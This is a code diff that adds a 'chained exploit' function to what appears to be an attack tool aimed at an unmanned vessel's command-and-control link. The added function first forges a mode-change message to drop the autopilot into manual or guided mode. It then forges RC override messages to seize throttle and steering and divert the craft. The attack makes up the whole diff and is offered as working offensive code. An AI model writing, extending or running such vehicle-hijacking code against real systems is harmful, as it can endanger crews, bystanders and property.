@@ -158,6 +158,21 @@ def inject_forged_rc_override(conn, throttle_pwm=1700, steering_pwm=1500, durati
                       f"throttle={throttle_pwm}, steering={steering_pwm}, {duration_s}s")
 
 
+def run_c2_chained_exploit(conn, target_mode="MANUAL", throttle_pwm=1700, steering_pwm=1500, duration_s=5.0):
+    """Executes a two-stage chained exploit against vehicle C2 command link:
+    - Stage 1: Mode Hijack (SET_MODE) overrides autopilot autonomy mode to MANUAL / GUIDED
+      so vehicle fails safe into operator control mode.
+    - Stage 2: Actuator Seizure (RC_CHANNELS_OVERRIDE) takes direct command authority over
+      steering and throttle servos, diverting the vessel.
+    """
+    print("[c2_chained_exploit] Initiating Stage 1: Mode Hijack ...")
+    inject_forged_mode_change(conn, target_mode=target_mode)
+    time.sleep(1.0)
+    print("[c2_chained_exploit] Initiating Stage 2: Actuator Seizure ...")
+    inject_forged_rc_override(conn, throttle_pwm=throttle_pwm, steering_pwm=steering_pwm, duration_s=duration_s)
+    print("[c2_chained_exploit] Chained exploit complete.")
+
+
 # --- Interactive control -----------------------------------------------------
 
 def main():
